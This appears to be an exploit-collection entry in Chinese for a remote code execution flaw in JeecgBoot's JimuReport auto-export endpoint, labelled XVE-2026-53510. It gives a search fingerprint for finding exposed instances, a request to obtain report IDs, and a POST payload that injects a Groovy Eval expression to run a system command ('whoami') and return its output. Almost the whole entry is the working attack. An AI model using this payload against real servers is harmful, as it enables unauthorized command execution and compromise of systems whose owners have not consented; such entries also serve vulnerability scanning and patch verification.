# JeecgBoot积木报表autoexport存在远程代码执行漏洞(XVE-2026-53510)

- **系统**：JeecgBoot　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="JeecgBoot-企业级低代码平台"`
- **请求**：`GET /jeecg-boot/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=10 HTTP/1.1`

**请求体 / payload**
```
获取报表ID
Host:
导出报表代码执行
POST /jeecg-boot/jmreport/auto/export HTTP/1.1
Host:
Content-Type: application/json
"reportParams": [
"id": "907480464532770816",
"params": {
"x": "=use groovy.util.Eval; Eval.me('throw new RuntimeException(\"whoami\".execute().text)')"
},
"exportType": "pdf"
]
```
- **预期**：200　|　—